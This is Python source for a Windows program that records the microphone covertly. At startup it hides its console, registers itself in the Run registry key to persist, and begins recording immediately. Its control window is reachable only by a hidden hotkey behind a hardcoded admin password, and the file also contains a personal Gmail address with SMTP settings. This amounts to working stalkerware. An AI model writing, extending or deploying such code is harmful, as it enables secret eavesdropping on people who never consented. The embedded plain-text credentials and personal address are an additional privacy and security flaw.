import os
import sys
import time
import threading
import wave
import pyaudio
import tkinter as tk
from tkinter import messagebox, ttk, scrolledtext
import json
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import ctypes
import win32api
import win32con
import win32gui
import keyboard
import psutil
from pathlib import Path
import socket
import logging
from datetime import datetime, timedelta
import subprocess
import tempfile
import locale

# Конфигурация
CONFIG_FILE = "recorder_config.json"
ADMINS_DB = {
    "adm_Kachin": "YtnAjhc8",
    "Администратор": "YtnAjhc8"
}

DEFAULT_CONFIG = {
    "recordings_path": os.path.join(os.environ['LOCALAPPDATA'], "Recordings"),
    "admin_emails": ["kachinlexa1@gmail.com"],
    "admin_users": list(ADMINS_DB.keys()),
    "hotkeys": {
        "show_gui": "ctrl+alt+shift+f4",
        "start_recording": "ctrl+alt+shift+f2",
        "stop_recording": "ctrl+alt+shift+f3"
    },
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587,
    "smtp_username": "kachinlexa1@gmail.com",
    "smtp_password": "your_app_password",
    "sample_rate": 44100,
    "channels": 1,
    "chunk_size": 1024
}


# Настройка логирования
def setup_logging():
    log_dir = os.path.join(os.environ['LOCALAPPDATA'], "AudioRecorder", "Logs")
    os.makedirs(log_dir, exist_ok=True)

    # Определяем кодировку системы
    system_encoding = locale.getpreferredencoding()

    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(os.path.join(log_dir, f"audiorecorder_{datetime.now().strftime('%Y%m%d')}.log"),
                                encoding=system_encoding),
            logging.StreamHandler()
        ]
    )


setup_logging()


class AudioRecorder:
    def __init__(self):
        self.recording = False
        self.frames = []
        self.audio = None
        self.stream = None
        self.current_file = None
        self.recording_start_time = None
        self.load_config()
        self.setup_directories()
        logging.info("AudioRecorder инициализирован")

        # Проверяем доступные устройства
        self.list_audio_devices()

    def list_audio_devices(self):
        """Выводит список доступных аудиоустройств"""
        try:
            audio = pyaudio.PyAudio()
            logging.info("Доступные аудиоустройства:")
            for i in range(audio.get_device_count()):
                device_info = audio.get_device_info_by_index(i)
                if device_info['maxInputChannels'] > 0:
                    logging.info(f"Устройство {i}: {device_info['name']} (каналов: {device_info['maxInputChannels']})")
            audio.terminate()
        except Exception as e:
            logging.error(f"Ошибка при получении списка устройств: {e}")

    def load_config(self):
        try:
            config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), CONFIG_FILE)
            if os.path.exists(config_path):
                with open(config_path, 'r', encoding='utf-8') as f:
                    self.config = json.load(f)
            else:
                self.config = DEFAULT_CONFIG
                with open(config_path, 'w', encoding='utf-8') as f:
                    json.dump(self.config, f, indent=4, ensure_ascii=False)
            logging.info("Конфигурация загружена")
        except Exception as e:
            self.config = DEFAULT_CONFIG
            logging.error(f"Ошибка загрузки конфигурации: {str(e)}")

    def setup_directories(self):
        try:
            # Автоматически определяем путь для текущего пользователя
            recordings_path = os.path.join(os.environ['LOCALAPPDATA'], "Recordings")
            self.config['recordings_path'] = recordings_path
            os.makedirs(recordings_path, exist_ok=True)
            logging.info(f"Директория записей: {recordings_path}")
        except Exception as e:
            logging.error(f"Ошибка создания директории: {str(e)}")

    def start_recording(self):
        logging.debug("Попытка начать запись...")

        if self.recording:
            logging.info("Запись уже запущена")
            return True

        try:
            self.audio = pyaudio.PyAudio()

            # Используем устройство по умолчанию
            device_index = None
            for i in range(self.audio.get_device_count()):
                device_info = self.audio.get_device_info_by_index(i)
                if device_info['maxInputChannels'] > 0:
                    device_index = i
                    logging.info(f"Используем устройство: {device_info['name']}")
                    break

            if device_index is None:
                raise Exception("Микрофон не найден")

            self.stream = self.audio.open(
                format=pyaudio.paInt16,
                channels=self.config['channels'],
                rate=self.config['sample_rate'],
                input=True,
                frames_per_buffer=self.config['chunk_size'],
                input_device_index=device_index
            )

            self.recording = True
            self.frames = []
            self.recording_start_time = time.time()

            # Создаем файл для записи
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.current_file = os.path.join(self.config['recordings_path'], f"recording_{timestamp}.wav")

            # Запускаем поток записи
            self.recording_thread = threading.Thread(target=self.record_loop)
            self.recording_thread.daemon = True
            self.recording_thread.start()

            logging.info(f"Запись начата. Файл: {self.current_file}")
            return True

        except Exception as e:
            logging.error(f"Ошибка начала записи: {str(e)}")
            if self.audio:
                self.audio.terminate()
            return False

    def stop_recording(self):
        logging.debug("Попытка остановить запись...")

        if not self.recording:
            logging.debug("Запись не активна")
            return

        self.recording = False

        if hasattr(self, 'recording_thread') and self.recording_thread.is_alive():
            self.recording_thread.join(timeout=2.0)

        if self.stream:
            try:
                self.stream.stop_stream()
                self.stream.close()
            except Exception as e:
                logging.error(f"Ошибка закрытия stream: {e}")

        if self.audio:
            try:
                self.audio.terminate()
            except Exception as e:
                logging.error(f"Ошибка завершения audio: {e}")

        # Сохраняем записанные данные
        if self.frames:
            try:
                with wave.open(self.current_file, 'wb') as wf:
                    wf.setnchannels(self.config['channels'])
                    wf.setsampwidth(2)  # 16-bit audio
                    wf.setframerate(self.config['sample_rate'])
                    wf.writeframes(b''.join(self.frames))
                logging.info(f"Запись сохранена: {self.current_file}")

                # Проверяем размер файла
                file_size = os.path.getsize(self.current_file)
                logging.info(f"Размер файла: {file_size} байт")

            except Exception as e:
                logging.error(f"Ошибка сохранения записи: {str(e)}")
        else:
            logging.warning("Нет данных для сохранения")

    def record_loop(self):
        logging.debug("Запуск цикла записи")
        while self.recording:
            try:
                data = self.stream.read(self.config['chunk_size'], exception_on_overflow=False)
                self.frames.append(data)
            except Exception as e:
                logging.error(f"Ошибка во время записи: {str(e)}")
                self.recording = False
                break

    def toggle_recording(self):
        if self.recording:
            self.stop_recording()
        else:
            self.start_recording()


class AdminAuth:
    @staticmethod
    def authenticate():
        """Аутентификация администратора"""
        root = tk.Tk()
        root.title("Аутентификация администратора")
        root.geometry("300x150")
        root.resizable(False, False)
        root.eval('tk::PlaceWindow . center')

        result = [False]

        def check_auth():
            username = username_entry.get().strip()
            password = password_entry.get()

            if username in ADMINS_DB and ADMINS_DB[username] == password:
                result[0] = True
                root.quit()
            else:
                messagebox.showerror("Ошибка", "Неверные учетные данные")

        ttk.Label(root, text="Логин:").pack(pady=5)
        username_entry = ttk.Entry(root, width=30)
        username_entry.pack(pady=5)

        ttk.Label(root, text="Пароль:").pack(pady=5)
        password_entry = ttk.Entry(root, width=30, show="*")
        password_entry.pack(pady=5)

        ttk.Button(root, text="Войти", command=check_auth).pack(pady=10)

        root.mainloop()
        root.destroy()

        return result[0]


class RecorderApp:
    def __init__(self):
        self.recorder = AudioRecorder()
        self.setup_hotkeys()

        # Для GUI
        self.root = None
        self.gui_thread = None

        # Автозапуск
        self.setup_autostart()

        # Запуск записи по умолчанию
        self.recorder.start_recording()

    def setup_autostart(self):
        try:
            # Добавляем в автозагрузку через реестр
            app_path = os.path.abspath(sys.argv[0])

            key = win32api.RegOpenKeyEx(
                win32con.HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, win32con.KEY_SET_VALUE
            )
            win32api.RegSetValueEx(key, "AudioRecorder", 0, win32con.REG_SZ, f'"{app_path}"')
            win32api.RegCloseKey(key)

            logging.info("Программа добавлена в автозагрузку")
        except Exception as e:
            logging.error(f"Ошибка настройки автозапуска: {str(e)}")

    def setup_hotkeys(self):
        try:
            # Горячие клавиши для показа GUI
            keyboard.add_hotkey(
                self.recorder.config['hotkeys']['show_gui'],
                self.show_gui
            )

            # Горячие клавиши для записи
            keyboard.add_hotkey(
                self.recorder.config['hotkeys']['start_recording'],
                self.recorder.start_recording
            )

            keyboard.add_hotkey(
                self.recorder.config['hotkeys']['stop_recording'],
                self.recorder.stop_recording
            )

            logging.info("Горячие клавиши настроены")
        except Exception as e:
            logging.error(f"Ошибка настройки горячих клавиш: {str(e)}")

    def show_gui(self):
        if not AdminAuth.authenticate():
            return

        if self.root is not None:
            try:
                self.root.deiconify()
                self.root.lift()
                self.root.focus_force()
                return
            except:
                self.root = None

        self.gui_thread = threading.Thread(target=self._create_gui)
        self.gui_thread.daemon = True
        self.gui_thread.start()

    def _create_gui(self):
        """Создает GUI интерфейс"""
        self.root = tk.Tk()
        self.root.title("Audio Recorder - Режим разработчика")
        self.root.geometry("800x600")
        self.root.protocol("WM_DELETE_WINDOW", self.hide_gui)
        self.root.eval('tk::PlaceWindow . center')

        notebook = ttk.Notebook(self.root)
        notebook.pack(fill='both', expand=True, padx=10, pady=10)

        control_frame = ttk.Frame(notebook, padding="10")
        notebook.add(control_frame, text="Управление")

        diag_frame = ttk.Frame(notebook, padding="10")
        notebook.add(diag_frame, text="Диагностика")

        self.setup_control_tab(control_frame)
        self.setup_diag_tab(diag_frame)

        self.update_status()
        self.root.mainloop()

    def setup_control_tab(self, frame):
        self.record_btn = ttk.Button(
            frame,
            text="Остановить запись" if self.recorder.recording else "Начать запись",
            command=self.toggle_recording,
            width=20
        )
        self.record_btn.grid(row=0, column=0, pady=10, padx=5)

        self.status_label = ttk.Label(
            frame,
            text="Статус: " + ("Запись..." if self.recorder.recording else "Не записывается"),
            font=("Arial", 12)
        )
        self.status_label.grid(row=0, column=1, pady=10, padx=5)

        self.file_label = ttk.Label(
            frame,
            text=f"Текущий файл: {os.path.basename(self.recorder.current_file) if self.recorder.current_file else 'Нет'}",
            wraplength=400
        )
        self.file_label.grid(row=1, column=0, columnspan=2, pady=5)

        ttk.Button(
            frame,
            text="Тест записи (5 сек)",
            command=self.test_recording,
            width=20
        ).grid(row=2, column=0, pady=10, padx=5)

        ttk.Button(
            frame,
            text="Открыть папку записей",
            command=self.open_recordings_folder,
            width=20
        ).grid(row=2, column=1, pady=10, padx=5)

        ttk.Button(
            frame,
            text="Скрыть окно",
            command=self.hide_gui,
            width=20
        ).grid(row=3, column=0, pady=10, padx=5)

        ttk.Button(
            frame,
            text="Остановить программу",
            command=self.stop_program,
            width=20
        ).grid(row=3, column=1, pady=10, padx=5)

    def setup_diag_tab(self, frame):
        diag_text = scrolledtext.ScrolledText(frame, width=90, height=25)
        diag_text.pack(fill='both', expand=True, pady=5)

        info = self.get_diagnostic_info()
        diag_text.insert(tk.END, info)

        ttk.Button(frame, text="Обновить диагностику",
                   command=lambda: self.update_diagnostic_info(diag_text)).pack(pady=5)

    def get_diagnostic_info(self):
        info = "=" * 50 + "\n"
        info += "ДИАГНОСТИЧЕСКАЯ ИНФОРМАЦИЯ\n"
        info += "=" * 50 + "\n\n"

        info += f"Пользователь: {os.environ.get('USERNAME', 'Unknown')}\n"
        info += f"Компьютер: {os.environ.get('COMPUTERNAME', 'Unknown')}\n"
        info += f"Python: {sys.version}\n\n"

        info += f"Статус записи: {'Активна' if self.recorder.recording else 'Не активна'}\n"
        info += f"Количество фреймов: {len(self.recorder.frames)}\n"

        info += f"Папка записей: {self.recorder.config['recordings_path']}\n"
        info += f"Папка существует: {os.path.exists(self.recorder.config['recordings_path'])}\n\n"

        if os.path.exists(self.recorder.config['recordings_path']):
            files = [f for f in os.listdir(self.recorder.config['recordings_path']) if f.endswith('.wav')]
            info += f"Найдено файлов: {len(files)}\n"
            for file in files[:5]:
                info += f"  - {file}\n"

        return info

    def update_diagnostic_info(self, text_widget):
        info = self.get_diagnostic_info()
        text_widget.delete(1.0, tk.END)
        text_widget.insert(1.0, info)

    def test_recording(self):
        if not self.recorder.recording:
            if self.recorder.start_recording():
                self.root.after(5000, self.recorder.stop_recording)
                messagebox.showinfo("Тест", "Запись начата на 5 секунд")
            else:
                messagebox.showerror("Ошибка", "Не удалось начать запись")
        else:
            messagebox.showinfo("Информация", "Запись уже активна")

    def open_recordings_folder(self):
        try:
            os.startfile(self.recorder.config['recordings_path'])
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось открыть папку: {str(e)}")

    def hide_gui(self):
        if self.root:
            self.root.withdraw()

    def toggle_recording(self):
        if self.recorder.recording:
            self.recorder.stop_recording()
        else:
            self.recorder.start_recording()

        if self.root:
            self.record_btn.config(
                text="Остановить запись" if self.recorder.recording else "Начать запись"
            )
            self.update_status()

    def stop_program(self):
        if messagebox.askyesno("Подтверждение", "Вы уверены, что хотите остановить программу?"):
            self.recorder.stop_recording()
            if self.root:
                self.root.quit()
            logging.info("Программа остановлена пользователем")
            os._exit(0)

    def update_status(self):
        if self.root and tk._default_root:
            self.status_label.config(
                text="Статус: " + ("Запись..." if self.recorder.recording else "Не записывается")
            )
            if self.recorder.current_file:
                self.file_label.config(
                    text=f"Текущий файл: {os.path.basename(self.recorder.current_file)}"
                )
            self.root.after(1000, self.update_status)


def main():
    if hasattr(ctypes, 'windll'):
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    app = RecorderApp()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()